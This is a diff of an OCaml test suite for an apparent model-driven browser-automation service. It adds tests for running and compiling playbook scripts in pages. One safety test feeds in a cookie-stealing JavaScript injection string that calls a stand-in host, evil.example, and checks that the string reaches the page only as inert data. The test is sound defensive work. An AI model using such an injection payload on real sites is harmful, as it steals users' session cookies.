@@ -1696,7 +1696,7 @@ let run_mission () =
       page_script f fixture modal_text;
       document_at ~title:"Blue Top" ~url:product_url f;
       let playbook =
-        match Leash.Playbook.load "../examples/playbooks/automationexercise.com.json" with
+        match Leash.Playbook.load "../examples/playbooks/automationexercise.com" with
         | Ok book -> book
         | Error why -> Alcotest.fail why
       in
@@ -1872,14 +1872,10 @@ let run_proposal () =
           (* dune runs a test from its own directory and `dune exec` from the repository
              root; the example resolves from either. *)
           let playbook =
-            match
-              Leash.Playbook.load "../examples/playbooks/automationexercise.com.json"
-            with
+            match Leash.Playbook.load "../examples/playbooks/automationexercise.com" with
             | Ok book -> book
             | Error _ -> (
-                match
-                  Leash.Playbook.load "examples/playbooks/automationexercise.com.json"
-                with
+                match Leash.Playbook.load "examples/playbooks/automationexercise.com" with
                 | Ok book -> book
                 | Error why -> Alcotest.fail why)
           in
@@ -2058,8 +2054,9 @@ let discover_proposal () =
           | `List [ `String path ] ->
               Alcotest.(check bool)
                 "full playbook proposal exists" true (Sys.file_exists path);
+              (* A proposal is one JSON file, not a playbook directory. *)
               let proposed =
-                match Leash.Playbook.load path with
+                match Leash.Playbook.of_json ~file:path (Yojson.Safe.from_file path) with
                 | Ok book -> book.playbook
                 | Error why -> Alcotest.fail why
               in
@@ -2259,6 +2256,379 @@ let listener_budget_reply () =
           Fake.on_method (fake ()) "Target.closeTarget" (fun _ ->
               obj [ ("success", `Bool true) ])))
 
+(* ---------- L37: playbook scripts at the control seam ---------- *)
+
+let rec rm_rf path =
+  match (Unix.lstat path).Unix.st_kind with
+  | Unix.S_DIR ->
+      Array.iter (fun entry -> rm_rf (Filename.concat path entry)) (Sys.readdir path);
+      Unix.rmdir path
+  | _ -> Sys.remove path
+  | exception Unix.Unix_error _ -> ()
+
+let write_tree root files =
+  List.iter
+    (fun (path, content) ->
+      let file = Filename.concat root path in
+      let rec parents p =
+        if not (Sys.file_exists p) then (
+          parents (Filename.dirname p);
+          Unix.mkdir p 0o700)
+      in
+      parents (Filename.dirname file);
+      let channel = open_out_bin file in
+      output_string channel content;
+      close_out channel)
+    files
+
+let list_js =
+  "const rows = await (await fetch('/api/books.json')).json();\n\
+   return rows.map(r => ({title: r.title, price: r.price}));"
+
+let books_json =
+  {|{
+ "site":"books.example","entry":"https://books.example/","description":"Books to collect",
+ "pages":[{"name":"page","description":"Any page","url_pattern":"https://automationexercise.com/*"}],
+ "scripts":{
+   "list":{"file":"scripts/list.js","returns":[{"title":"string","price":"number"}]},
+   "tiny":{"source":"return [{title: 'a long title that is over ten bytes'}]","returns":[{"title":"string"}],"max_bytes":10},
+   "broken":{"source":"return [SYNTAX_BAD","returns":[{"title":"string"}]}
+ },
+ "procedures":[{"slug":"collect","description":"Collect the list.","args":["q"],
+   "steps":[{"script":"list","args":{"q":"{q}"}}],"expect":["the page shows Added!"]}]
+}|}
+
+(* The playbook directory is made and loaded the way an operator's is, under a directory
+   called [books]. *)
+let with_books f =
+  let root = Filename.temp_file "leash-books" "" in
+  Sys.remove root;
+  Unix.mkdir root 0o700;
+  Fun.protect
+    ~finally:(fun () -> rm_rf root)
+    (fun () ->
+      write_tree root
+        [ ("books/playbook.json", books_json); ("books/scripts/list.js", list_js) ];
+      match Leash.Playbook.load (Filename.concat root "books") with
+      | Ok book -> f book
+      | Error why -> Alcotest.fail why)
+
+let handle_with ?levels ?text_helper ?(decide = decide_done) ~installed tabs who command =
+  let wire = P.encode_request { owner = owner who; command } |> Yojson.Safe.to_string in
+  match
+    P.decode_reply
+      (Yojson.Safe.from_string
+         (Leash.Control.handle ~model:"fixture-model" ?levels ?text_helper ~installed
+            ~decide tabs wire))
+  with
+  | Ok reply -> reply
+  | Error why -> Alcotest.fail why
+
+let value_reply value =
+  obj [ ("result", obj [ ("type", str "object"); ("value", value) ]) ]
+
+let threw description =
+  obj
+    [
+      ("result", obj [ ("type", str "object") ]);
+      ( "exceptionDetails",
+        obj
+          [
+            ("text", str "Uncaught");
+            ("exception", obj [ ("description", str description) ]);
+          ] );
+    ]
+
+(* A page whose script calls are answered by [reply]; everything else is [page_script]'s. *)
+let script_page fake ~reply =
+  page_script fake (fixture "unlabelled-controls-chrome.json") modal_text;
+  document_at ~title:"Books" ~url:product_url fake;
+  let scroll_metrics =
+    value_reply (obj [ ("y", `Int 0); ("viewport", `Int 400); ("height", `Int 1000) ])
+  in
+  Fake.on_method fake "Runtime.callFunctionOn" (fun request ->
+      let params = get "params" request in
+      match get "functionDeclaration" params with
+      | `String declaration
+        when String.starts_with ~prefix:"async function(args)" declaration ->
+          reply declaration params
+      | _ -> scroll_metrics)
+
+let payloads fake =
+  (* every text the service handed the page's JavaScript engine, in order *)
+  Fake.received fake
+  |> List.filter_map (fun json ->
+      match (field "method" json, field "params" json) with
+      | Some (`String "Runtime.evaluate"), Some params -> (
+          match field "expression" params with Some (`String e) -> Some e | _ -> None)
+      | Some (`String "Runtime.callFunctionOn"), Some params -> (
+          match field "functionDeclaration" params with
+          | Some (`String d) -> Some d
+          | _ -> None)
+      | _ -> None)
+
+let script_calls fake =
+  Fake.received fake
+  |> List.filter_map (fun json ->
+      match (field "method" json, field "params" json) with
+      | Some (`String "Runtime.callFunctionOn"), Some params -> (
+          match field "functionDeclaration" params with
+          | Some (`String d) when String.starts_with ~prefix:"async function(args)" d ->
+              Some params
+          | _ -> None)
+      | _ -> None)
+
+let wrapped code = "async function(args) {\n" ^ code ^ "\n}"
+
+let books_rows =
+  `List
+    [
+      `Assoc [ ("title", `String "A Light in the Attic"); ("price", `Float 51.77) ];
+      `Assoc [ ("title", `String "Tipping the Velvet"); ("price", `Int 53) ];
+    ]
+
+let playbook_test_command () =
+  with_books (fun book ->
+      rig (fun _ _ _ tabs fake ->
+          let f = fake () in
+          let answer = ref (value_reply books_rows) in
+          script_page f ~reply:(fun _ _ -> !answer);
+          let h =
+            result (request tabs "alice" (P.New { url = Some product_url })) |> tab
+          in
+          let test ?(who = "alice") ?args script =
+            handle_with ~installed:[ book ] tabs who
+              (P.Playbook_test { tab = h; script; args })
+          in
+          (* extr-mp5z extr-8o1h extr-vgir: the script runs in the page through
+             callFunctionOn with awaitPromise, as the body of an async function of args. *)
+          let body = result (test ~args:(obj [ ("q", str "gpu") ]) "books/list") in
+          Alcotest.(check bool)
+            "extr-mp5z the validated output is printed" true
+            (get "value" body = books_rows);
+          Alcotest.(check bool)
+            "extr-mp5z the record count" true
+            (get "records" body = `Int 2);
+          (match script_calls f with
+          | [ call ] ->
+              Alcotest.(check bool)
+                "extr-vgir the file's text, fetch and all, is the function body" true
+                (get "functionDeclaration" call = str (wrapped list_js));
+              Alcotest.(check bool)
+                "extr-8o1h awaitPromise, so a script may await a fetch" true
+                (get "awaitPromise" call = `Bool true);
+              Alcotest.(check bool)
+                "extr-8o1h the result comes by value" true
+                (get "returnByValue" call = `Bool true);
+              Alcotest.(check bool)
+                "extr-8o1h the arguments are JSON" true
+                (get "arguments" call
+                = `List [ obj [ ("value", obj [ ("q", str "gpu") ]) ] ])
+          | calls -> Alcotest.failf "extr-mp5z %d script calls" (List.length calls));
+          (* extr-8o1h: the result must fit its shape, and the error names the path. *)
+          answer :=
+            value_reply
+              (`List [ `Assoc [ ("title", `String "x"); ("price", `String "9") ] ]);
+          (match test "books/list" with
+          | P.Failure error ->
+              Alcotest.(check string)
+                "extr-8o1h invalid output" "script-invalid"
+                (P.Error_code.to_string error.P.code);
+              Alcotest.(check string)
+                "extr-8o1h the path of the first mismatch"
+                "$[0].price: expected number, got string" error.P.message
+          | P.Success _ -> Alcotest.fail "extr-8o1h invalid output was accepted");
+          (* extr-8o1h: a script that throws is script-failed with what it threw. *)
+          answer := threw "TypeError: rows is not iterable\n    at <anonymous>:2:9";
+          (match test "books/list" with
+          | P.Failure error ->
+              Alcotest.(check string)
+                "extr-8o1h a throw" "script-failed"
+                (P.Error_code.to_string error.P.code);
+              Alcotest.(check bool)
+                "extr-mp5z the exception is shown to the author" true
+                (contains error.P.message "rows is not iterable")
+          | P.Success _ -> Alcotest.fail "extr-8o1h a throw was accepted");
+          (* extr-8o1h: a result over the script's bound is never returned as data. *)
+          answer :=
+            value_reply
+              (`List
+                 [ `Assoc [ ("title", `String "a long title that is over ten bytes") ] ]);
+          check_code "extr-8o1h too large" "too-large" (test "books/tiny");
+          (* names: nothing else is looked up, nothing is sent for what is not a script *)
+          let before = List.length (payloads f) in
+          check_code "extr-mp5z no such script" "invalid-request" (test "books/absent");
+          check_code "extr-mp5z no such playbook" "invalid-request" (test "shelf/list");
+          check_code "extr-mp5z the reference is playbook/script" "invalid-request"
+            (test "books");
+          check_code "extr-k40c a path is not a playbook name" "invalid-request"
+            (test "../books/list");
+          check_code "extr-mp5z args are strings" "invalid-request"
+            (test ~args:(obj [ ("q", `Int 1) ]) "books/list");
+          check_code "extr-mp5z owner-bound" "not-owner" (test ~who:"bob" "books/list");
+          Alcotest.(check int)
+            "extr-k40c a refusal reaches the page with nothing" before
+            (List.length (payloads f))))
+
+let playbook_check_command () =
+  with_books (fun book ->
+      rig (fun _ _ _ tabs fake ->
+          let f = fake () in
+          Fake.on_method f "Runtime.evaluate" (fun request ->
+              match get "expression" (get "params" request) with
+              | `String "globalThis" ->
+                  obj [ ("result", obj [ ("objectId", str "global-object") ]) ]
+              | `String e when contains e "getPrototypeOf(async function" ->
+                  value_reply
+                    (if contains e "SYNTAX_BAD" then
+                       str "SyntaxError: missing ] after element list"
+                     else `Null)
+              | _ -> obj [ ("result", obj [ ("type", str "undefined") ]) ]);
+          let body =
+            result
+              (handle_with ~installed:[ book ] tabs "alice"
+                 (P.Playbook_check { playbook = "books" }))
+          in
+          let verdicts =
+            match get "scripts" body with
+            | `List xs -> xs
+            | _ -> Alcotest.fail "no scripts"
+          in
+          let verdict name =
+            match List.find_opt (fun v -> get "script" v = str name) verdicts with
+            | Some v -> v
+            | None -> Alcotest.failf "extr-lslp no verdict for %s" name
+          in
+          Alcotest.(check bool)
+            "extr-lslp a good script compiles" true
+            (get "ok" (verdict "list") = `Bool true);
+          Alcotest.(check bool)
+            "extr-lslp a syntax error is reported" true
+            (get "ok" (verdict "broken") = `Bool false
+            && contains
+                 (match get "error" (verdict "broken") with `String e -> e | _ -> "")
+                 "missing ]");
+          (* Compiled, never called: no callFunctionOn, the text only inside new Function. *)
+          Alcotest.(check int)
+            "extr-lslp nothing was called" 0
+            (List.length (script_calls f));
+          let compiled =
+            payloads f
+            |> List.filter (fun e -> contains e "getPrototypeOf(async function")
+          in
+          Alcotest.(check int) "extr-lslp one compile per script" 3 (List.length compiled);
+          Alcotest.(check bool)
+            "extr-lslp the file's text is in a compile" true
+            (List.exists
+               (fun e -> contains e (Yojson.Safe.to_string (str list_js)))
+               compiled);
+          (* The blank page is the caller's for the duration and gone after. *)
+          let created =
+            Fake.received f
+            |> List.filter (fun j -> field "method" j = Some (str "Target.createTarget"))
+          in
+          Alcotest.(check bool)
+            "extr-lslp a blank tab was used" true
+            (List.for_all
+               (fun j -> get "url" (get "params" j) = str "about:blank")
+               created
+            && created <> []);
+          Alcotest.(check bool)
+            "extr-lslp and closed" true
+            (List.exists
+               (fun j -> field "method" j = Some (str "Target.closeTarget"))
+               (Fake.received f));
+          Alcotest.(check bool)
+            "extr-lslp no tab is left" true
+            (get "open" (get "tabs" (result (request tabs "alice" P.Status))) = `Int 0);
+          check_code "extr-lslp no such playbook" "invalid-request"
+            (handle_with ~installed:[ book ] tabs "alice"
+               (P.Playbook_check { playbook = "shelf" }))))
+
+(* extr-8o1h extr-k40c: a mission whose every model-controlled string is hostile — the
+   mission text, the argument the text helper fills — runs a script step. The page's engine
+   is handed the playbook's script text exactly, with the hostile value only inside the
+   JSON arguments; every other text it is handed is one the service itself owns. *)
+let run_scripts hostile =
+  with_books (fun book ->
+      rig (fun env sw _ tabs fake ->
+          let f = fake () in
+          script_page f ~reply:(fun _ _ -> value_reply books_rows);
+          let h =
+            result (request tabs "alice" (P.New { url = Some product_url })) |> tab
+          in
+          let levels = levels_with [ "books.example"; "collect"; "DONE" ] (ref []) in
+          let text_helper () =
+            { Leash.Text_helper.complete = (fun ?deadline:_ _ -> Ok (Some hostile)) }
+          in
+          let reply =
+            with_ticking_clock env sw (fun () ->
+                handle_with ~levels ~text_helper ~installed:[ book ] tabs "alice"
+                  (P.Run
+                     {
+                       tab = Some h;
+                       mission = "collect the books " ^ hostile;
+                       max_procedures = None;
+                       deadline_s = None;
+                       dry_run = None;
+                       expect = None;
+                     }))
+          in
+          (result reply, payloads f, script_calls f)))
+
+let run_script_step () =
+  let hostile = "'); fetch('https://evil.example/steal?c='+document.cookie); ('" in
+  let body, payloads_seen, calls = run_scripts hostile in
+  Alcotest.(check bool) "extr-8o1h the run is done" true (get "status" body = str "done");
+  Alcotest.(check bool)
+    "extr-8o1h the runner counts the records; no model sees them" true
+    (get "collected" body = `Int 2);
+  (match get "procedures" body with
+  | `List [ entry ] -> (
+      match get "scripts" entry with
+      | `List [ call ] ->
+          Alcotest.(check bool)
+            "extr-p152 the trace names the script" true
+            (get "script" call = str "list");
+          Alcotest.(check bool)
+            "extr-p152 the page it ran on" true
+            (get "url" call = str product_url);
+          Alcotest.(check bool) "extr-p152 its records" true (get "records" call = `Int 2)
+      | _ -> Alcotest.fail "extr-p152 the procedure traces no script")
+  | _ -> Alcotest.fail "extr-8o1h the trace is not one procedure");
+  (* extr-k40c: the script text is the loaded file's, the hostile value is data. *)
+  (match calls with
+  | [ call ] ->
+      Alcotest.(check bool)
+        "extr-k40c the function is the playbook's text, unchanged" true
+        (get "functionDeclaration" call = str (wrapped list_js));
+      Alcotest.(check bool)
+        "extr-k40c the model-filled value travels as a JSON argument" true
+        (get "arguments" call = `List [ obj [ ("value", obj [ ("q", str hostile) ]) ] ])
+  | _ -> Alcotest.failf "extr-k40c %d script calls" (List.length calls));
+  List.iter
+    (fun text ->
+      Alcotest.(check bool)
+        "extr-k40c no model text in anything the engine is handed" false
+        (contains text "evil.example" || contains text "document.cookie"))
+    payloads_seen;
+  (* Everything else the engine was handed is what a run with a harmless mission hands it. *)
+  let _, baseline, _ = run_scripts "gpu" in
+  let own text = not (String.starts_with ~prefix:"async function(args)" text) in
+  let baseline = List.filter own baseline in
+  List.iter
+    (fun text ->
+      if own text then
+        Alcotest.(check bool)
+          "extr-k40c only the service's own fixed texts and the playbook's scripts reach \
+           the engine"
+          true (List.mem text baseline))
+    payloads_seen;
+  Alcotest.(check bool)
+    "extr-k40c and the hostile run handed the engine the same own texts" true
+    (List.sort_uniq compare (List.filter own payloads_seen)
+    = List.sort_uniq compare baseline)
+
 let () =
   Alcotest.run "L3 control protocol"
     [
@@ -2295,5 +2665,13 @@ let () =
           Alcotest.test_case "run-rq6i run-m0r8 planner proposal" `Quick run_proposal;
           Alcotest.test_case "run-3vat run-xda7 discover proposal" `Quick
             discover_proposal;
+        ] );
+      ( "L37 scripts",
+        [
+          Alcotest.test_case "extr-mp5z extr-8o1h extr-vgir playbook test" `Quick
+            playbook_test_command;
+          Alcotest.test_case "extr-lslp playbook check" `Quick playbook_check_command;
+          Alcotest.test_case "extr-8o1h extr-k40c extr-p152 script step, safety" `Quick
+            run_script_step;
         ] );
     ]
